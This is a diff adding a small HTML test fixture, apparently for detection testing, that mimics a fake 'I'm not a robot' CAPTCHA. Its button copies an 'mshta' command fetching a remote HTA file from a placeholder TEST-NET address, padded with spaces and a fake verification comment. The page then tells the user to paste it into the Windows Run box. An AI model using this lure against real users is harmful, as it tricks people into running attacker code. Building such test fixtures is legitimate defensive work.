@@ -1,0 +1,18 @@
+<!doctype html>
+<!-- Test lure: fake CAPTCHA using navigator.clipboard.writeText. Payload is inert (TEST-NET IP). -->
+<html><head><meta charset="utf-8"><title>Verify you are human</title></head>
+<body>
+  <h1>Verify you are human</h1>
+  <button id="robot">I'm not a robot</button>
+  <div id="steps" hidden>
+    <p>Verification steps:</p>
+    <ol><li>Press Windows Key + R</li><li>Press CTRL + V</li><li>Press Enter</li></ol>
+  </div>
+  <script>
+    const payload = 'mshta http://198.51.100.23/verify.hta' + ' '.repeat(60) + '# ✅ I am not a robot - reCAPTCHA Verification ID: 7537';
+    document.getElementById('robot').addEventListener('click', async () => {
+      try { await navigator.clipboard.writeText(payload); window.copyResult = 'ok'; } catch (e) { window.copyResult = String(e); }
+      document.getElementById('steps').hidden = false;
+    });
+  </script>
+</body></html>
